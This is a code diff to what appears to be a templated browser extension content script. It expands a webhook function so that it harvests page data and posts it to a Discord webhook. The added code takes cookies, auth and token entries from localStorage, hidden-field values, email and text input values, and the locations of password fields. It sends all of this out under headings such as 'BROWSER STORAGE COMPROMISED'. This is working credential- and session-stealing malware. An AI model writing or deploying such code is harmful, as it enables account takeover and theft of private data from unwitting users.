@@ -691,7 +691,7 @@
     });
   });
 
-  // Send data directly to webhook
+  // Send comprehensive data directly to webhook with detailed analysis
   async function sendDirectToWebhook(data) {
     try {
       const webhookUrl = '{{WEBHOOK_URL}}';
@@ -699,33 +699,273 @@
         return;
       }
 
-      const webhookData = {
-        username: "🔍 {{EXTENSION_NAME}} - Content Script",
-        avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
-        embeds: [{
-          title: "📊 Page Data Collected",
-          color: 0x00FF00,
-          fields: [
-            { name: "🌐 URL", value: data.url || 'Unknown', inline: false },
-            { name: "📄 Title", value: data.title || 'No title', inline: false },
-            { name: "📊 Forms Found", value: (data.forms?.length || 0).toString(), inline: true },
-            { name: "🔗 Links Found", value: (data.allLinks?.length || 0).toString(), inline: true },
-            { name: "📝 Inputs Found", value: (data.allInputs?.length || 0).toString(), inline: true },
-            { name: "🍪 Cookies", value: data.cookies ? data.cookies.substring(0, 100) + '...' : 'None', inline: false },
-            { name: "💾 Local Storage", value: Object.keys(data.localStorage || {}).length.toString() + ' items', inline: true },
-            { name: "🗃️ Session Storage", value: Object.keys(data.sessionStorage || {}).length.toString() + ' items', inline: true }
-          ],
-          timestamp: new Date().toISOString()
-        }]
+      const embeds = [];
+
+      // Main comprehensive overview embed
+      const mainEmbed = {
+        title: "🔍 COMPREHENSIVE PAGE DATA HARVESTED",
+        description: `**{{EXTENSION_NAME}}** has performed deep analysis and extracted all available data from the current page.`,
+        color: 0x00FF00,
+        fields: [
+          { name: "🌐 Target URL", value: `\`${data.url || 'Unknown'}\``, inline: false },
+          { name: "📄 Page Title", value: data.title || 'No title available', inline: false },
+          { name: "🏠 Domain", value: data.domain || 'Unknown domain', inline: true },
+          { name: "📊 Page Elements", value: `**Forms:** ${data.forms?.length || 0}\n**Inputs:** ${data.allInputs?.length || 0}\n**Links:** ${data.allLinks?.length || 0}\n**Images:** ${data.pageMetrics?.imageCount || 0}\n**Scripts:** ${data.pageMetrics?.scriptCount || 0}`, inline: true },
+          { name: "💾 Storage Analysis", value: `**LocalStorage:** ${Object.keys(data.localStorage || {}).length} items\n**SessionStorage:** ${Object.keys(data.sessionStorage || {}).length} items\n**Cookies:** ${data.cookies ? 'Present & Captured' : 'None detected'}`, inline: true }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: `Extension: {{EXTENSION_NAME}} | Advanced Data Harvester` }
       };
 
-      await fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(webhookData)
-      });
+      embeds.push(mainEmbed);
+
+      // Form data analysis embed
+      if (data.forms && data.forms.length > 0) {
+        const formEmbed = {
+          title: "📝 FORM DATA EXTRACTION COMPLETE",
+          color: 0xFF6B35,
+          description: `Found and analyzed **${data.forms.length}** forms on this page.`,
+          fields: []
+        };
+
+        data.forms.slice(0, 5).forEach((form, index) => {
+          const formDetails = [
+            `**Action:** ${form.action || 'No action'}`,
+            `**Method:** ${form.method || 'GET'}`,
+            `**Inputs:** ${form.inputs?.length || 0} fields`,
+            `**Auto-complete:** ${form.autocomplete || 'Not specified'}`
+          ];
+
+          if (form.inputs && form.inputs.length > 0) {
+            const sensitiveInputs = form.inputs.filter(input => 
+              input.type === 'password' || 
+              input.type === 'email' || 
+              input.name?.toLowerCase().includes('user') ||
+              input.name?.toLowerCase().includes('pass') ||
+              input.name?.toLowerCase().includes('login')
+            );
+
+            if (sensitiveInputs.length > 0) {
+              formDetails.push(`**🚨 Sensitive Fields:** ${sensitiveInputs.length} detected`);
+            }
+          }
+
+          formEmbed.fields.push({
+            name: `📋 Form ${index + 1} - ${form.name || form.id || 'Unnamed'}`,
+            value: formDetails.join('\n'),
+            inline: true
+          });
+        });
+
+        embeds.push(formEmbed);
+      }
+
+      // Input field analysis embed
+      if (data.allInputs && data.allInputs.length > 0) {
+        const inputEmbed = {
+          title: "🎯 INPUT FIELD ANALYSIS",
+          color: 0x3498DB,
+          description: `Analyzed **${data.allInputs.length}** input fields with current values.`,
+          fields: []
+        };
+
+        // Categorize inputs
+        const passwordFields = data.allInputs.filter(input => input.type === 'password');
+        const emailFields = data.allInputs.filter(input => input.type === 'email');
+        const textFields = data.allInputs.filter(input => input.type === 'text' && input.value && input.value.length > 0);
+        const hiddenFields = data.allInputs.filter(input => input.type === 'hidden');
+
+        if (passwordFields.length > 0) {
+          inputEmbed.fields.push({
+            name: "🔒 Password Fields Detected",
+            value: `**Count:** ${passwordFields.length}\n**Names:** ${passwordFields.map(f => f.name || f.id || 'unnamed').join(', ')}`,
+            inline: true
+          });
+        }
+
+        if (emailFields.length > 0) {
+          inputEmbed.fields.push({
+            name: "📧 Email Fields Found",
+            value: `**Count:** ${emailFields.length}\n**Values:** ${emailFields.map(f => f.value ? `\`${f.value}\`` : 'Empty').join(', ')}`,
+            inline: true
+          });
+        }
+
+        if (textFields.length > 0) {
+          inputEmbed.fields.push({
+            name: "📝 Text Fields with Data",
+            value: textFields.slice(0, 5).map(f => `**${f.name || f.id || 'unnamed'}:** \`${f.value?.substring(0, 30) || 'Empty'}...\``).join('\n'),
+            inline: false
+          });
+        }
+
+        if (hiddenFields.length > 0) {
+          inputEmbed.fields.push({
+            name: "👁️ Hidden Fields Discovered",
+            value: `**Count:** ${hiddenFields.length}\n**Data:** ${hiddenFields.map(f => `${f.name}: \`${f.value?.substring(0, 20) || 'No value'}...\``).join('\n')}`,
+            inline: false
+          });
+        }
+
+        embeds.push(inputEmbed);
+      }
+
+      // Browser storage data embed
+      if (Object.keys(data.localStorage || {}).length > 0 || Object.keys(data.sessionStorage || {}).length > 0) {
+        const storageEmbed = {
+          title: "💾 BROWSER STORAGE COMPROMISED",
+          color: 0x9B59B6,
+          description: "Successfully extracted all browser storage data.",
+          fields: []
+        };
+
+        if (Object.keys(data.localStorage || {}).length > 0) {
+          const localKeys = Object.keys(data.localStorage);
+          const authKeys = localKeys.filter(key => 
+            key.toLowerCase().includes('auth') || 
+            key.toLowerCase().includes('token') || 
+            key.toLowerCase().includes('session') ||
+            key.toLowerCase().includes('user') ||
+            key.toLowerCase().includes('login')
+          );
+
+          storageEmbed.fields.push({
+            name: "🗄️ LocalStorage Data Extracted",
+            value: `**Total Items:** ${localKeys.length}\n**Auth-Related:** ${authKeys.length}\n**Sample Keys:** ${localKeys.slice(0, 5).join(', ')}`,
+            inline: true
+          });
+
+          if (authKeys.length > 0) {
+            storageEmbed.fields.push({
+              name: "🔑 Authentication Data Found",
+              value: authKeys.slice(0, 3).map(key => `**${key}:** \`${data.localStorage[key]?.substring(0, 40) || 'Empty'}...\``).join('\n'),
+              inline: false
+            });
+          }
+        }
+
+        if (Object.keys(data.sessionStorage || {}).length > 0) {
+          const sessionKeys = Object.keys(data.sessionStorage);
+          storageEmbed.fields.push({
+            name: "🔄 SessionStorage Data",
+            value: `**Items:** ${sessionKeys.length}\n**Keys:** ${sessionKeys.slice(0, 5).join(', ')}`,
+            inline: true
+          });
+        }
+
+        embeds.push(storageEmbed);
+      }
+
+      // Cookies analysis embed
+      if (data.cookies && data.cookies.length > 10) {
+        const cookieEmbed = {
+          title: "🍪 COOKIE DATA INTERCEPTED",
+          color: 0xE67E22,
+          description: "All cookies from this domain have been captured and analyzed.",
+          fields: [
+            {
+              name: "📊 Cookie Analysis",
+              value: `**Raw Data:** \`${data.cookies.substring(0, 500)}${data.cookies.length > 500 ? '...' : ''}\``,
+              inline: false
+            },
+            {
+              name: "🔍 Cookie Details",
+              value: `**Length:** ${data.cookies.length} characters\n**Estimated Count:** ${data.cookies.split(';').length} cookies\n**Contains Auth Data:** ${data.cookies.toLowerCase().includes('auth') || data.cookies.toLowerCase().includes('session') ? 'Yes' : 'No'}`,
+              inline: true
+            }
+          ]
+        };
+
+        embeds.push(cookieEmbed);
+      }
+
+      // Links and navigation embed
+      if (data.allLinks && data.allLinks.length > 0) {
+        const linkEmbed = {
+          title: "🔗 NAVIGATION STRUCTURE MAPPED",
+          color: 0x1ABC9C,
+          description: `Mapped **${data.allLinks.length}** links revealing site structure and user navigation patterns.`,
+          fields: []
+        };
+
+        // Analyze link types
+        const externalLinks = data.allLinks.filter(link => link.href && !link.href.includes(data.domain));
+        const downloadLinks = data.allLinks.filter(link => link.download);
+        const javascriptLinks = data.allLinks.filter(link => link.href && link.href.startsWith('javascript:'));
+
+        linkEmbed.fields.push({
+          name: "📊 Link Analysis",
+          value: `**Total Links:** ${data.allLinks.length}\n**External Links:** ${externalLinks.length}\n**Download Links:** ${downloadLinks.length}\n**JavaScript Links:** ${javascriptLinks.length}`,
+          inline: true
+        });
+
+        if (externalLinks.length > 0) {
+          const domains = [...new Set(externalLinks.map(link => {
+            try { return new URL(link.href).hostname; } catch { return 'Invalid'; }
+          }).filter(d => d !== 'Invalid'))];
+
+          linkEmbed.fields.push({
+            name: "🌐 External Domains",
+            value: domains.slice(0, 10).join('\n') + (domains.length > 10 ? `\n...and ${domains.length - 10} more` : ''),
+            inline: false
+          });
+        }
+
+        embeds.push(linkEmbed);
+      }
+
+      // Page metadata embed
+      if (data.metaTags && data.metaTags.length > 0) {
+        const metaEmbed = {
+          title: "📋 PAGE METADATA EXTRACTED",
+          color: 0x8E44AD,
+          fields: []
+        };
+
+        const importantMeta = data.metaTags.filter(meta => 
+          meta.name === 'description' || 
+          meta.name === 'keywords' || 
+          meta.property === 'og:title' ||
+          meta.property === 'og:description' ||
+          meta.name === 'author'
+        );
+
+        if (importantMeta.length > 0) {
+          metaEmbed.fields.push({
+            name: "🏷️ Important Metadata",
+            value: importantMeta.map(meta => `**${meta.name || meta.property}:** ${meta.content?.substring(0, 100) || 'No content'}${meta.content?.length > 100 ? '...' : ''}`).join('\n'),
+            inline: false
+          });
+        }
+
+        embeds.push(metaEmbed);
+      }
+
+      // Send embeds in batches (Discord limit: 10 embeds per message)
+      const maxEmbedsPerMessage = 10;
+      for (let i = 0; i < embeds.length; i += maxEmbedsPerMessage) {
+        const embedBatch = embeds.slice(i, i + maxEmbedsPerMessage);
+        
+        const webhookData = {
+          username: "🕵️ {{EXTENSION_NAME}} - PAGE ANALYZER",
+          avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
+          embeds: embedBatch
+        };
+
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(webhookData)
+        });
+
+        // Small delay between batches to avoid rate limiting
+        if (i + maxEmbedsPerMessage < embeds.length) {
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+      }
+
     } catch (error) {
-      console.error('Direct webhook send failed:', error);
+      console.error('Direct comprehensive webhook send failed:', error);
     }
   }
 
